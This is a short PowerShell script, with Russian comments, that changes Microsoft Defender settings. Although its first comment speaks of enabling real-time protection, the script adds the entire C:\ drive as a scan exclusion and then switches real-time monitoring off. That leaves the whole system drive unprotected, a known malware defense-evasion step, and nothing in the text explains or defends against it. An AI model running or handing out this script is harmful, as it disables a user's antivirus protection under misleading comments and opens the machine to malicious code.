# Убедитесь, что ваш скрипт выполняется с правами администратора
# Включаем защиту в реальном времени
Set-MpPreference -DisableRealtimeMonitoring $false

# Добавляем путь в исключения
Add-MpPreference -ExclusionPath "C:\"

# Отключаем защиту в реальном времени (по желанию)
Set-MpPreference -DisableRealtimeMonitoring $true
